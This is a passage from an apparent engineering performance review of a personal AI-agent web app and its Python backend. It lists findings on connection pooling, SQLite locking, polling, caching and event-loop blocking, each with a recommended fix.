- **Recommendation:** Move the chrome (StatusStrip, CoralHost, LeadChatHost, AppMcpBridge, header) into a route-group layout, e.g. `app/(shell)/layout.tsx`, so it persists across navigations. Pages then pass only title and actions (via a context or a slot). Also cache /api/status/summary server-side per principal for ~15-30s (unstable_cache or an in-process TTL map). Drop the `projects(limit:100)` leg in favour of a dedicated running-cards count endpoint.

### agent-home-ui-5. Busy project runs trigger a full-page router.refresh every 2s, re-running a 5-call backend fan-out (with a serial first hop) per open tab — Medium

- **Location:** `agent-home/src/components/projects/useProjectEvents.ts:37,61-80, agent-home/src/app/projects/[slug]/page.tsx:42-75, agent-home/src/components/MobileShell.tsx:65-84`
- **Effort / confidence:** M / medium
- **Description:** Every `update` frame that advances `latest_event_id` causes `router.refresh()`, throttled to one per 2s plus a trailing call. While a run is active, the events cursor moves constantly, so each open project tab re-renders the whole RSC tree every 2s. That means `client.project(slug)` is awaited first (page.tsx:43) and only then the four parallel fan-out reads: board, playbook, directives and doctor. The MobileShell principal/session/facets path also re-runs. That is about 0.5 Python requests per second per tab for the whole run, and each refresh pays the two-hop waterfall latency. Doctor and board are usually the heaviest reads, and they are rarely what changed.
- **Recommendation:** Raise the throttle (5-10s) or debounce by event type. Better, include in the SSE frame which panels changed and refetch only those (client-side fetch to the existing /api/projects/[slug]/* routes) instead of refreshing the whole page. Start the four fan-out reads in parallel with `project()` and resolve the 404 afterwards, which removes the serial hop.

### agent-home-ui-6. Repo Caddy template compresses all SSE routes; production's hand-made @sse matcher (per docs) covers only chat paths, not the five project/card/run streams — Low

- **Location:** `agent-home/deploy/Caddyfile.agent-home:26-37, docs/deployment/PRODUCTION.md:83-91, agent-home/src/app/api/projects/[slug]/events/stream/route.ts:34-35`
- **Effort / confidence:** S / medium
- **Description:** PRODUCTION.md says `encode zstd gzip` buffers text/event-stream until the stream ends, even though the routes send `cache-control: no-transform`. Production therefore routes `/api/chat/stream` and `/api/chat/attach` through a non-encoding handle. The checked-in template has no such exception: any re-provision from it makes chat stream arrive as one burst at the end. The doc's matcher also lists no project SSE routes: /api/projects/[slug]/events/stream, cards/[taskId]/{activity,stream} and runs/[runNo]/{activity,stream}. If production matches the doc, the board live tail, card reasoning and run activity are held back by gzip, which defeats the push design and makes the UI look frozen. Confidence is medium because the production Caddyfile is hand-maintained and not in the repo.
- **Recommendation:** Commit the real production site block to `deploy/Caddyfile.agent-home`. Use an `@sse` matcher (e.g. `path /api/chat/stream /api/chat/attach /api/projects/*/events/stream /api/projects/*/cards/*/activity /api/projects/*/cards/*/stream /api/projects/*/runs/*/activity /api/projects/*/runs/*/stream`, or `header Accept text/event-stream`) whose handle has no `encode` and uses `reverse_proxy { flush_interval -1 }`. Alternatively, restrict `encode` with a `match` block that excludes text/event-stream.

### agent-home-ui-7. Chat unread badge polls the 200-row session list every 45s even in hidden or backgrounded tabs — Low

- **Location:** `agent-home/src/components/coral/useChatUnread.ts:27-34`
- **Effort / confidence:** S / high
- **Description:** Unlike StatusStrip and ProjectsList, this interval isn't gated on `document.visibilityState`. Every open tab, including a backgrounded installed PWA on desktop, fetches `/api/chat/sessions?limit=200` every 45s for as long as it lives. That is a 200-row recent-sessions query on the Python side with tags and categories. The wake handlers already cover the moment a tab becomes visible, so hidden-tab polling only adds cost. The hook also re-reads and JSON-parses the whole localStorage last-read map on every tick.
- **Recommendation:** Skip the tick when `document.visibilityState !== 'visible'`, as StatusStrip does. Consider a lightweight `unread-count`/`max(last_active)` endpoint, or `limit` plus `since=` filtering, instead of pulling 200 full SessionSummary rows to count unread ones.

### agent-home-ui-8. Conversation transcript is fetched and rendered in full: no pagination, tool rows filtered out only in the browser, no windowing — Low

- **Location:** `agent-home/src/app/chat/page.tsx:83-86, agent-home/src/app/api/chat/messages/route.ts, agent-home/src/lib/api/client.ts:509-513, agent-home/src/components/chat/ChatPane.tsx:89-92,319-379,1029-1039`
- **Effort / confidence:** M / medium
- **Description:** `sessionMessages(sessionId)` takes no limit or cursor. The BFF passes the whole transcript through, and the client then drops tool and system rows with `visible()`. Tool outputs, often the largest rows, are serialized into the SSR payload and the JSON response only to be thrown away. Every visible bubble is mounted and Markdown-parsed at once with no virtualization. The same full fetch repeats on every conversation switch and after every externally-started turn (`reloadTranscript`). Long-lived topics, the main use case for a personal agent, get slower to open, and large payloads are costly on mobile. Confidence is medium: I did not verify whether the Python endpoint already trims tool content.
- **Recommendation:** Add `limit`/`before` (cursor) parameters to `/api/sessions/{id}/messages` and its BFF route. Filter to user and assistant roles server-side. Load the last N turns and lazy-load older ones on scroll-up. For very long threads, consider content-visibility:auto or windowing for off-screen bubbles.

### agent-home-ui-9. Service-worker runtime cache is never pruned across deploys (static VERSION), and duplicates the HTTP cache with a put on every asset fetch — Low

- **Location:** `agent-home/public/sw.js:13-15,27-39,66-82, agent-home/public/sw-v3.js:1-131`
- **Effort / confidence:** S / high
- **Description:** `VERSION = 'agent-home-v3'` is a hard-coded constant, and activate only deletes caches whose name does not start with VERSION. Every deploy adds a full new set of content-hashed /_next/static chunks to `agent-home-v3-runtime`, and nothing evicts them. The cache grows on every device for every deploy, with frequent deploys from develop. On iOS this pushes the origin toward quota eviction, which also drops the push and offline shell caches. The handler is network-first (despite the header comment saying stale-while-revalidate) and runs `cache.put` on every successful asset response, so each page load rewrites chunks the browser HTTP cache already holds as immutable. `sw-v3.js` is a byte-identical dead copy (only sw.js is served by /api/sw).
- **Recommendation:** Inject the build SHA into the SW (e.g. have /api/sw replace a `__BUILD__` placeholder with NEXT_PUBLIC_HERMES_BUILD) so that each deploy gets fresh caches and activate prunes the old ones. Alternatively, cap the runtime cache (LRU, e.g. 60 entries) or limit it to cache-on-miss. Skip `cache.put` when the cache already holds that hashed URL. Delete sw-v3.js and fix the header comment.

### agent-home-ui-10. LiveStatusBar ticks a 1s clock unconditionally, re-rendering the project status subtree forever even with no open run or a hidden tab — Low

- **Location:** `agent-home/src/components/projects/live/LiveStatusBar.tsx:46-52,552, agent-home/src/components/projects/ProjectDetailView.tsx:372`
- **Effort / confidence:** S / high
- **Description:** `useNow()` starts a `setInterval(..., 1000)` with no running or visibility condition. LiveStatusBar is always mounted on the project detail page, so the 700-line component (run/board derivations, hooks for useRunLive and useRunActivity) re-renders once a second for as long as a project page is open, including idle projects and background tabs. Other clocks in the app (ChatPane, CardDetailView, LeadChatHost) are correctly gated on in-flight state.
- **Recommendation:** Only tick when `openRunOf(project)` is running and `document.visibilityState === 'visible'`. Isolate the elapsed label in a small child component so the tick doesn't re-render the whole bar.

### agent-home-ui-11. Markdown/HTML rendering stack ships in every page's client bundle through the always-mounted, closed-by-default LeadChatHost — Low

- **Location:** `agent-home/src/components/coral/LeadChatHost.tsx:9,66, agent-home/src/components/MobileShell.tsx:118, agent-home/src/components/chat/RichText.tsx:3-6`
- **Effort / confidence:** S / medium
- **Description:** LeadChatHost statically imports MessageBubble, then RichText, then react-markdown, remark-gfm, rehype-raw (with parse5 and hast-util-raw) and rehype-sanitize. MobileShell mounts LeadChatHost on every signed-in page, while the panel starts with `open=false`. That parser stack, typically the heaviest client dependency here, is therefore in the first-load JS of every route, including lightweight ones like Settings or Todos, and costs parse and compile time on mobile cold starts. Confidence is medium: I couldn't run `next build` to measure chunk sizes because no Node is on the review VM.
- **Recommendation:** Load the panel body with `next/dynamic(() => import('./LeadChatPanel'), { ssr: false })` when the panel is first opened, keeping only the FAB eager. Verify with `@next/bundle-analyzer` or the `next build` route-size table.

### agent-home-ui-12. Chat page deep-link fallback repeats the identical session-list query — Low

- **Location:** `agent-home/src/app/chat/page.tsx:52-77`
- **Effort / confidence:** S / high
- **Description:** When `?session=<id>` isn't in the first page, the code fetches again with exactly the same parameters (`order: 'recent', limit: CHAT_SESSION_LIST_LIMIT`). The second call can only return the same 200 rows, so it is a guaranteed wasted Python round trip, plus SSR latency, on every deep link to an older conversation (memory citations, push notifications into an old topic), and it still fails to find the session.
- **Recommendation:** Look up the requested session directly (e.g. a `client.session(id)` / `GET /api/sessions/{id}` summary) and prepend it, or remove the duplicate call.

## cli-core

The biggest production cost in cli-core is connection lifecycle: every Supabase-backed operation (todos, credentials, principals) opens a fresh asyncpg connection with no pool, so latency and Supavisor/Postgres connection budget scale with request volume. Credential materialization for skill activation adds two fresh connections, a full rmtree and a rewrite on every call, and its sync bridge can park the calling thread. Kanban's SQLite layer is well configured (WAL, busy_timeout, indexes), but recompute_ready does N+1 queries inside an IMMEDIATE transaction on every dispatch tick, and notification claims read an unbounded backlog. Smaller repeated-work costs show up in card-activity flushes, which reconnect and re-run the schema DDL every 0.5 s per worker, and in load_config, which runs ensure_hermes_home's mkdir/chmod/SOUL.md checks under a global lock even when the cache hits. Several earlier hot spots have already been fixed with caches (config, Nous status, Copilot JWT, profile skill counts, alias map), so they are not reported.

**Strengths:** hermes_cli/config.py caches the parsed and env-expanded config by (mtime_ns, size, managed-file signature, secret-scope fingerprint), and load_config_readonly skips the deepcopy for agent-loop hot paths.; hermes_cli/datastore.py:477-537 caches schema-owner verification per (dsn, schema, profile) in _verified_schemas, so the owner check costs nothing after the first connection.; hermes_cli/copilot_auth.py exchange_copilot_token caches Copilot JWTs in-process until close to expiry (_jwt_cache), avoiding a network exchange per request.; hermes_cli/profiles.py caches _count_skills by a cheap scandir signature plus a 30 s TTL, and list_profiles builds the alias map once instead of O(N*M) rescans.; hermes_cli/kanban_db.py uses WAL, busy timeouts, write_txn helpers and indexed task_events lookups. card_activity bounds retained data (MAX_EVENTS=400, MAX_TEXT, 6 h TTL) and batches relay events on a background thread instead of writing per token.

### cli-core-1. Every Supabase operation opens a new asyncpg connection (no pool) — High

- **Location:** `hermes_cli/datastore.py:93-119, hermes_cli/credential_store.py:423-438, hermes_cli/credential_store.py:457-470`
- **Effort / confidence:** M / high
- **Description:** SupabaseAppStore.connect() calls asyncpg.connect(dsn, server_settings={search_path}) on every call. SupabaseCredentialStore._connect() and the other store classes call it for every logical operation (list/get/put/initialize) unless a connection is passed in explicitly, then close it. So each request pays TCP+TLS+SCRAM auth and the startup round trips (tens to hundreds of ms to a remote pooler). Concurrent gateway turns, dashboard requests and kanban workers each open their own short-lived connections. That churn can exhaust the Supavisor client limit or Postgres max_connections on the single box and shows up as tail latency. The schema-owner check itself is cached (_verified_schemas), so connection setup is the dominant cost.
- **Recommendation:** Keep a process-wide asyncpg pool per (dsn, schema), e.g. asyncpg.create_pool(dsn, min_size=1, max_size=N, server_settings={'search_path': schema}, statement_cache_size=0 if behind Supavisor transaction mode). Have connect() return a pool-acquired connection (or add an async context manager acquire()) and release it instead of closing. Keep explicit connection injection for multi-statement transactions, and close the pool at gateway/web shutdown.

### cli-core-2. Skill activation re-materializes all credentials: 2 fresh DB connections, rmtree and a full rewrite each time, plus a sync bridge that can block the calling loop thread — Medium

- **Location:** `tools/skills_tool.py:1450-1463, hermes_cli/credential_store.py:747-800, hermes_cli/credential_store.py:803-817, hermes_cli/credential_store.py:741`
- **Effort / confidence:** M / medium
- **Description:** For any skill with required_credential_files, skill_view calls materialize_for_mounts_sync() on every activation. That resolves the owner principal (PrincipalStore.get_owner, one new connection), lists all readable credentials (a second connection), shutil.rmtree()s credentials-materialized/, then mkdir/chmod/mkstemp/json.dump/replace for every credential, even when nothing changed. If a loop is running on the calling thread, materialize_for_mounts_sync creates a throwaway ThreadPoolExecutor and blocks on .result(), so that event loop stalls for the whole Supabase round trip plus disk rewrite. Repeated activations inside one conversation repeat all of this. Concurrent activations also race on the rmtree, which can remove files another activation just registered.
- **Recommendation:** Cache the materialized set per (principal, store mode), keyed by a cheap fingerprint (e.g. max(updated_at)/count from one query on a pooled connection). Skip materialization when unchanged and write or delete only changed entries instead of rmtree. When called from a running loop, await the coroutine (or run it via asyncio.to_thread at the caller) instead of blocking the loop thread on a per-call executor.

### cli-core-3. recompute_ready runs N+1 queries inside an IMMEDIATE write transaction on every dispatch tick — Medium

- **Location:** `hermes_cli/kanban_db.py:3572-3610`
- **Effort / confidence:** M / high
- **Description:** recompute_ready takes the SQLite writer lock (write_txn) and selects every todo/blocked task. For each one it runs _has_sticky_block() (blocked rows) and a separate parent-status JOIN query. The dispatcher calls this every tick even when no parent changed, so writer-lock hold time and CPU grow linearly with waiting cards. Meanwhile workers' heartbeats, completions and notifier claims on the same board DB queue behind busy_timeout.
- **Recommendation:** Replace the loop with a set-based UPDATE ... WHERE status IN ('todo','blocked') AND NOT EXISTS (SELECT 1 FROM task_links l JOIN tasks p ON p.id=l.parent_id WHERE l.child_id=tasks.id AND p.status NOT IN ('done','archived')), with the sticky-block and failure-limit predicates as SQL conditions, or evaluate only children of tasks whose status changed since the last tick. Do the read-only candidate selection outside the IMMEDIATE transaction.

### cli-core-4. Notification claim loads an unbounded event backlog while holding the SQLite writer lock — Medium

- **Location:** `hermes_cli/kanban_db.py:8674-8696, hermes_cli/kanban_db.py:8722-8725`
- **Effort / confidence:** S / medium
- **Description:** unseen_events_for_sub() selects every task_events row with id > cursor (ORDER BY id, no LIMIT) and json.loads each payload into Event objects. claim_unseen_events_for_sub() calls it inside write_txn (BEGIN IMMEDIATE). A subscription that was offline while a long-running task emitted many events (status, heartbeat, reasoning-related kinds when kinds is unset) therefore materializes the whole backlog in memory and holds the board's writer lock while doing so. That delays every other kanban writer and produces one oversized notification burst.
- **Recommendation:** Add a limit parameter (e.g. 200) to unseen_events_for_sub/claim_unseen_events_for_sub, advance the cursor only to the last returned id, and drain the rest on subsequent ticks. Optionally coalesce or skip stale non-terminal kinds when the backlog exceeds a threshold.

### cli-core-5. Card-activity relay reconnects SQLite and re-runs WAL pragma plus schema DDL on every 0.5 s flush and every tool event — Medium

- **Location:** `hermes_cli/card_activity.py:88-94, hermes_cli/card_activity.py:285, hermes_cli/card_activity.py:342-379, hermes_cli/card_activity.py:226-231`
- **Effort / confidence:** S / high
- **Description:** Each WorkerRelay._write batch calls _connect(), which does mkdir, sqlite3.connect, PRAGMA journal_mode=WAL, PRAGMA busy_timeout and executescript(_SCHEMA) (two CREATE TABLE IF NOT EXISTS), then BEGIN IMMEDIATE, then closes. FLUSH_SECONDS=0.5 means up to 2 reconnects/sec per streaming worker. publish_tool/publish_status open a fresh connection per call as well. With several concurrent workers sharing one card_activity.db, this multiplies file-open/lock/WAL-index overhead and writer-lock acquisitions without benefit.
- **Recommendation:** Open one connection per WorkerRelay (owned by its background thread) and reuse it for all batches and close(). Run the schema/WAL setup once per path per process, e.g. guarded by a module-level set of initialized paths. Route publish_* through a cached per-path connection or the relay queue.

### cli-core-6. Nous runtime credential resolution holds the shared auth-store lock across the token-refresh HTTP call — Medium

- **Location:** `hermes_cli/auth.py:5700-5702, hermes_cli/auth.py:5796, hermes_cli/auth.py:5809-5844`
- **Effort / confidence:** M / medium
- **Description:** resolve_nous_runtime_credentials enters _auth_store_lock() at 5700. The lock is still held when it opens an httpx.Client and, if the access token is unusable or force_refresh is set, also takes _nous_shared_store_lock and performs _refresh_access_token over the network (bounded only by the configured timeout). auth.json is shared by every provider in the profile, so while one Nous refresh is in flight (or hanging until timeout), every other auth read/write in all processes of that profile blocks: other agent starts, pool lookups, status/CLI commands. Single-flight of the refresh itself is legitimate (rotating refresh tokens), but the profile-wide auth-store lock does not need to cover the network call.
- **Recommendation:** Keep _nous_shared_store_lock as the single-flight guard for the refresh, but take the profile _auth_store_lock only for the short load and the final persist. Read state under the lock, release it, refresh under the Nous-specific lock, then reacquire _auth_store_lock and merge or persist after re-checking the refresh_token fingerprint. Callers holding a still-valid token should not wait at all.

### cli-core-7. load_config/load_config_readonly do ~22 mkdir/chmod syscalls plus a SOUL.md read under a global RLock on every call, even on cache hits — Low

- **Location:** `hermes_cli/config.py:6595-6598, hermes_cli/config.py:842-866, hermes_cli/config.py:821-839`
- **Effort / confidence:** S / high
- **Description:** _load_config_impl calls ensure_hermes_home() inside _CONFIG_LOCK before it consults _LOAD_CONFIG_CACHE. In the default unmanaged mode that means mkdir+_secure_dir (chmod, optional chown) for HERMES_HOME and 10 subdirectories, plus _ensure_default_soul_md, which reads SOUL.md and compares it against the legacy template. load_config_readonly is documented as the per-API-turn hot path, and web/gateway code calls load_config per request. The config cache saves the ~13 ms parse, but this filesystem work still runs every time and serializes all threads behind the global config lock.
- **Recommendation:** Call ensure_hermes_home() once per HERMES_HOME per process (memoize on str(get_hermes_home()), resetting on profile switch) or move it out of the read path into startup/save_config. At minimum, do the cache-hit check before ensure_hermes_home and outside the lock where safe.

## cli-http-api

The API generally uses bounded pagination, SQLite WAL with indexes, and asyncio.to_thread for several blocking paths, but the hot dashboard paths still do far more work per request than they need to. The biggest issue is the Supabase access layer: every PrincipalStore call opens a new asyncpg connection and re-runs about 11 DDL/DML statements, including an ALTER TABLE that takes an ACCESS EXCLUSIVE lock. It also clears the schema-verification cache, so later connects re-verify ownership. Almost every authenticated request goes through this path, and project endpoints repeat it for each profile. Project listing and the live SSE streams are the other main scalability risks, because their cost grows with project count and with the number of connected clients. Unpaginated transcripts and synchronous analytics, capacity and system-stat work in async handlers also add avoidable event-loop latency.

**Strengths:** Project and todo APIs expose explicit page limits and cursor-based pagination on several list endpoints.; The kanban and project SQLite databases use WAL mode, busy timeouts, connection-closing helpers, and indexes on common relationship and status columns.; Several blocking project, board, git and chat-turn operations are moved to asyncio.to_thread or run_in_executor.; Live streams diff serialized rows and send heartbeats rather than resending unchanged payloads.; Session listing attaches tags in bulk rather than running one tag query per session.; A new AIAgent built per dashboard chat turn restores the stored system prompt from SessionDB when it still matches the runtime (agent/conversation_loop.py:308-335), so per-conversation prompt caching is preserved.

### cli-http-api-1. Every PrincipalStore call opens a fresh connection, re-runs schema DDL including an ACCESS EXCLUSIVE ALTER TABLE, and defeats the schema-verification cache — High

- **Location:** `hermes_cli/access.py:575-587, hermes_cli/access.py:530-560, hermes_cli/access.py:1175-1186, hermes_cli/datastore.py:93-120, hermes_cli/datastore.py:350-414, hermes_cli/datastore.py:479-537, hermes_cli/web_server.py:3141-3228`
- **Effort / confidence:** M / high
- **Description:** PrincipalStore.get, resolve_alias and the other access methods each call self._store.connect(), which opens a new asyncpg connection (no pool), and then await initialize_access(conn). initialize_access runs ensure_app_schema (a SELECT current_setting, CREATE SCHEMA IF NOT EXISTS, CREATE TABLE IF NOT EXISTS schema_owner and INSERT ... ON CONFLICT) and then ACCESS_SCHEMA_SQL (8 statements, including `ALTER TABLE principals ADD COLUMN IF NOT EXISTS active` and several CREATE [UNIQUE] INDEX IF NOT EXISTS). In Postgres, ALTER TABLE takes an ACCESS EXCLUSIVE lock on principals even when the column already exists, and CREATE INDEX IF NOT EXISTS locks the table before checking whether the index exists. Every auth resolution therefore briefly serializes against all other principals readers and writers. claim_schema_owner also ends with `_verified_schemas.clear()` (datastore.py:414), so the process-wide cache that verify_schema_owner relies on is wiped on every call, and the next connect() pays two more round trips (to_regclass and SELECT schema_owner). _comms_resolve_principal is awaited by nearly every dashboard endpoint and makes up to 2 such connect cycles (alias, then get, or the owner fallback). With the status strip polling every 30 s, ChatPane polling active_run every 10 s, and SSE re-auth, this means roughly 15-25 Postgres round trips, plus TCP and auth connection setup, per API request through Supavisor or the database.
- **Recommendation:** Run initialize_access and ACCESS_SCHEMA_SQL once per (dsn, schema) per process, at startup or on first use, and record success in a module-level set the same way _verified_schemas is used. Remove `_verified_schemas.clear()` from claim_schema_owner, or clear only the affected key. Replace per-call asyncpg.connect with a shared asyncpg pool per (dsn, schema). Have _comms_resolve_principal resolve the alias and the principal on one connection (or in one query joining aliases to principals). Move additive column migrations out of the request path entirely.

### cli-http-api-2. Project listing performs an unbounded full scan with per-project query fan-out — High

- **Location:** `hermes_cli/projects_api.py:597-684, hermes_cli/projects_db.py:932-940`
- **Effort / confidence:** L / high
- **Description:** GET /api/registry/projects loads every project from SQLite, sorts the full result set in Python, then iterates until the requested page is filled. For each candidate it does membership, profile, output, delivery, link, member, board-task and health work, and several of those are separate database queries. The limit bounds the response size but not the initial scan, nor the work needed to find matching rows when status, health, query or access filters exclude most projects. Each dashboard refresh therefore costs O(total projects × per-project queries), and concurrent refreshes compete for SQLite and CPU.
- **Recommendation:** Move filtering, ordering, keyset pagination and the common access predicates into SQL. Fetch only the candidate page, then batch-load outputs, deliveries, links, members, profiles and board rollups for those project IDs with IN (...) queries. Add an index matching the status/archived/created_at access pattern.

### cli-http-api-3. Project endpoints fan out sequentially across every profile, opening two uncached Supabase connections per profile — High

- **Location:** `hermes_cli/projects_api.py:105-125, hermes_cli/projects_api.py:208, hermes_cli/projects_api.py:694, hermes_cli/projects_api.py:870, hermes_cli/console_scope.py:100-111, hermes_cli/console_scope.py:204-241`
- **Effort / confidence:** M / high
- **Description:** _enrolled_profiles is awaited on project list, detail and access paths. It calls console_scope.enrolled_profiles, which iterates every profile in the registry one after another. For each profile it builds a new PrincipalStore(_comms_app_store()) and calls _principal_for_subject, which runs resolve_alias and then get. Each of those opens its own asyncpg connection and re-runs initialize_access (see the PrincipalStore finding). With N profiles, a single project-list request makes about 2N+2 serial connection setups and about 25N round trips before any project work starts. Nothing is cached, even though enrolment changes rarely, and the status-summary refresh triggers this list every 30 s for each open dashboard.
- **Recommendation:** Cache the enrolment set per user_id with a short TTL (for example 30-60 s), invalidated on principal mutations. Resolve each profile's principal with one connection and one query, and run the per-profile lookups concurrently with asyncio.gather over a pool. If profile schemas share a DSN, a single UNION query across the profile schemas would replace the loop.

### cli-http-api-4. Each live project stream polls SQLite every second for each connected client — High

- **Location:** `hermes_cli/projects_api.py:3038-3065, hermes_cli/projects_api.py:3149-3165`
- **Effort / confidence:** L / high
- **Description:** The shared _watch_stream loop calls its synchronous producer through asyncio.to_thread once per second for every open stream. The project-events producer opens a board connection and runs project_events_tail on every tick. The run and card streams likewise reopen project and board connections each tick and rebuild their payloads. Load therefore grows linearly with open tabs and users, in database opens and in default thread-pool jobs, even when nothing has changed. The project-events stream never ends on its own, so this load lasts as long as each client stays connected.
- **Recommendation:** Use one shared watcher per board/project that multiplexes changes to all subscribers, or a change notifier, instead of a poll per client. If polling stays, back off adaptively when idle, coalesce watchers for the same project or run, enforce per-user and global stream limits, and keep connections open across ticks.

### cli-http-api-5. Session-messages endpoint returns the entire transcript with no pagination or size cap — High

- **Location:** `hermes_cli/web_server.py:10308-10316, hermes_state.py:3865-3885, agent-home/src/components/chat/ChatPane.tsx:330-364`
- **Effort / confidence:** M / high
- **Description:** GET /api/sessions/{session_id}/messages calls get_messages(sid) and returns the complete list as one JSON response. get_messages selects every matching row and decodes all content in Python, including large tool outputs. ChatPane fetches this endpoint when a conversation opens and again after turns complete. Long-running conversations such as the lead chat therefore cost large SQLite reads, Python allocations, JSON serialization, network transfer and browser memory on every load. There is no limit, cursor, byte budget or newest-first window.
- **Recommendation:** Add limit and before_id cursor parameters with a server-enforced maximum, defaulting to the newest window. Let the UI page older messages on scroll. Truncate or omit large tool payloads in the list view and serve them on demand.

### cli-http-api-6. Usage analytics runs synchronous database aggregation and report generation inside an async handler — Medium

- **Location:** `hermes_cli/web_server.py:15636-15688`
- **Effort / confidence:** S / high
- **Description:** The async GET /api/analytics/usage handler runs three SQLite aggregate queries directly and then calls InsightsEngine(db).generate(days=days), none of it in asyncio.to_thread or an executor. On a database with a large session and message history this occupies the event-loop thread and delays unrelated API requests and SSE delivery. The agent-home status summary requests usage analytics on every refresh, so this blocking work is triggered regularly.
- **Recommendation:** Run the whole analytics calculation in asyncio.to_thread or a dedicated executor. Cache reports per profile and day range with a short TTL, and consider pre-aggregated daily usage tables for common ranges such as 30 days.

### cli-http-api-7. Each status-strip refresh fans out into five API calls and recomputes project summaries — Medium

- **Location:** `agent-home/src/app/api/status/summary/route.ts:12-23, hermes_cli/projects_api.py:597-684`
- **Effort / confidence:** M / high
- **Description:** Every status-summary request concurrently calls system stats, usage analytics, capacity, cron jobs and a project listing of up to 100 active projects. Each of those Python endpoints re-resolves the principal (two uncached connect-plus-DDL cycles), and the project list adds the per-profile enrolment fan-out and the full-scan aggregation. The strip polls every 30 s, so each open dashboard produces a recurring burst of five backend requests and dozens of Postgres round trips, even when the displayed counters have not changed.
- **Recommendation:** Serve a cached server-side status snapshot with a short TTL, invalidated on relevant mutations. Return only the counters the strip shows, computed with cheap SQL COUNT/aggregate queries rather than full project payloads, and do not recompute 30-day analytics on every refresh.

### cli-http-api-8. System stats deliberately blocks the event loop for 100 ms to sample CPU — Medium

- **Location:** `hermes_cli/web_server.py:2470-2516`
- **Effort / confidence:** S / high
- **Description:** The async GET /api/system/stats handler calls psutil.cpu_percent(interval=0.1), which sleeps for 100 ms on the event-loop thread. During that time no other request or SSE frame on the process is served. Because the endpoint is part of the 30 s status-summary fan-out, every open dashboard pays this stall on every refresh.
- **Recommendation:** Return the latest sample from the existing background CPU sampler (cpu_sampler_loop), or call psutil.cpu_percent(interval=None) for a non-blocking delta, or move the call into asyncio.to_thread.

### cli-http-api-9. active_run poll (every 10 s per open chat) opens SessionDB synchronously on the event loop — Low

- **Location:** `hermes_cli/web_server.py:11119-11150, agent-home/src/components/chat/ChatPane.tsx:87, agent-home/src/components/chat/ChatPane.tsx:219-239`
- **Effort / confidence:** S / high
- **Description:** ChatPane polls /api/chat/active every 10 s (ACTIVE_WATCH_MS). The Python handler first runs _comms_resolve_principal (the uncached connect-plus-DDL path above). It then calls _resolved_chat_session_id, which synchronously opens a SessionDB, runs resolve_session_id and resolve_resume_session_id, and closes it, all on the event-loop thread, before linearly scanning _CHAT_RUNS. Each request is cheap on its own, but it is frequent, scales with open chat tabs, and adds SQLite open/close latency to the event loop.
- **Recommendation:** Check _CHAT_RUNS first and return immediately when no run is in flight (the common case), resolving the session chain only if there are candidate runs. Alternatively, cache the root-to-resume id mapping and run the SessionDB work in asyncio.to_thread. Consider pushing run start over an existing stream instead of polling.

### cli-http-api-10. Capacity endpoint runs per-profile file reads and SQLite indicator queries synchronously in an async handler — Low

- **Location:** `hermes_cli/web_server.py:14901-14935, hermes_cli/capacity.py:302-325, hermes_cli/capacity.py:659-690`
- **Effort / confidence:** S / medium
- **Description:** GET /api/capacity calls headroom(), and therefore collect_indicators, plus cpu_history() directly on the event loop. collect_session_load reads a lease file for every profile home, and the contention and latency indicators run SQLite queries. The work is modest, but it runs on every 30 s status-summary refresh and grows with profile count.
- **Recommendation:** Wrap headroom() and cpu_history() in asyncio.to_thread, and cache the computed payload for a few seconds, since indicators are advisory.

### cli-http-api-11. Dashboard auth verification can make synchronous identity-provider network calls inside async middleware — Low

- **Location:** `plugins/dashboard_auth/supabase/__init__.py:239-250, hermes_cli/dashboard_auth/middleware.py:300-357`
- **Effort / confidence:** M / medium
- **Description:** The async dashboard auth middleware calls each provider's synchronous verify_session directly. The Supabase provider's token refresh path uses synchronous httpx.post. When a token needs refreshing, the event loop blocks for the duration of the provider's network latency, and providers are tried one after another. This is low severity because it only applies on refresh or expiry paths.
- **Recommendation:** Use httpx.AsyncClient with connection reuse and strict timeouts, or run provider verification in a bounded executor. Choose the verifier from the token issuer instead of trying providers serially.

## custom-integrations

The custom integrations use reasonable building blocks: incremental Google Calendar sync, a stable skill-text prefix in triage prompts, an mtime-cached config loader, an OAuth access-token cache, and SKIP LOCKED for the seminar queue. The biggest risks come from how the pieces are put together. The triage agents keep a SQLite write transaction open while they make Postgres and Telegram network calls, which can starve the batcher's 5s busy_timeout. The email batcher re-scans the whole email table (including bodies) every 5 seconds without an index. Calendar triage sends one LLM call for every expanded instance of a recurring event, and also for past events. Every inbound item, to-do and credential lookup opens a new event loop and a new asyncpg connection, and the IMAP and Calendar HTTP calls have no network timeouts, so ingestion can stall indefinitely. Only the calendar and seminar systemd units are in deploy/. The email and WhatsApp paths were reviewed from source, assuming they run as long-lived workers.

**Strengths:** Calendar sync uses syncToken/updatedMin deltas (maxResults=250). It skips unchanged events by comparing raw_json before doing any UPDATE or registry work (calendar_poller.py:250-253), and has a UNIQUE (google_event_id, account_id) lookup key.; Triage system prompts put the stable skills text first and the variable data (family info, messages) after it, so the provider's prefix cache can be reused across calls.; MEMORY.md enters agent sessions as a frozen snapshot (tools/memory_tool.py:22-34), so the memory_facts that triage writes do not invalidate prompt caches mid-conversation.; load_config() caches on (mtime_ns, size) (hermes_cli/config.py:6440+), so the credential-store config lookups are cheap.; The OAuth helper caches access tokens with an expiry margin (custom/google_oauth.py:95-125). Token refresh POSTs use a 15s timeout (hermes_cli/google_oauth.py:36).; The seminar queue claims jobs with FOR UPDATE SKIP LOCKED and reuses one httpx.AsyncClient for the worker's lifetime (hermes_cli/seminar_outreach.py:108-121).; The escalation pusher sends Telegram messages with a 10s timeout and stops the pass after the first send failure instead of hammering Telegram (escalation_pusher_v2.py:218-228).; The WhatsApp SQLite path uses WAL mode with a busy timeout. Calendar triage caps work at 10 events per pass.

### custom-integrations-1. Triage holds a SQLite write transaction open during Postgres and Telegram network calls, which can make the batcher drop WhatsApp messages — High

- **Location:** `custom/shared/triage_handlers.py:64-101, custom/shared/triage_handlers.py:103-150, custom/shared/triage_handlers.py:385-390, custom/shared/todo_registration.py:170-215, custom/shared/todo_registration.py:223-240, custom/whatsapp/triage_agent.py:190-229, custom/whatsapp/batcher.py:60-62, custom/whatsapp/batcher.py:265-280`
- **Effort / confidence:** S / medium
